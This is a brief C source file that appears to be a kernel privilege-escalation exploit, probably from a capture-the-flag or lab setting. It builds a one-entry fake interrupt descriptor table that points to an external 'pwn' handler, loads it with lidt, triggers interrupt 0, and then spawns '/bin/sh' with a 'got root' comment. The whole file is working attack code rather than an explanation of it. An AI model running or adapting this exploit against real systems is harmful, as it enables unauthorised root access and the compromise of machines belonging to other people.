#include <asm/prctl.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>

struct __attribute__((packed)) idt_entry {
  uint16_t isr_low;
  uint16_t kernel_cs;
  uint8_t ist;
  uint8_t attributes;
  uint16_t isr_mid;
  uint32_t isr_high;
  uint32_t reserved;
};

struct __attribute__((packed)) idt_desc {
  uint16_t size;
  // only one entry needed here
  struct idt_entry *entries;
};

extern void lidt(struct idt_desc *desc);
extern void pwn(void);

void init_idt_entry(struct idt_entry *entry, void (*handler)(void),
                    uint8_t flags) {
  entry->isr_low = (uint32_t)handler & 0xFFFF;
  entry->kernel_cs = 0x10;
  entry->ist = 0;
  entry->attributes = flags;
  entry->isr_mid = ((uint64_t)handler >> 16) & 0xFFFF;
  entry->isr_high = ((uint64_t)handler >> 32) & 0xFFFFFFFF;
  entry->reserved = 0;
}

int main(void) {
  uint64_t gs_base;
  struct idt_entry entry, fake;
  struct idt_desc desc;

  init_idt_entry(&entry, pwn, 0xEE);

  // create an IDT of 1 entry (int 0). We'll need to reset IDT to the original
  // value, otherwise the system will obviously blow
  desc.size = sizeof(struct idt_entry) - 1;
  desc.entries = &entry;

  // load the fake IDT
  lidt(&desc);

  // trigger
  asm("int 0");

  // got root
  system("/bin/sh");

  return 0;
}
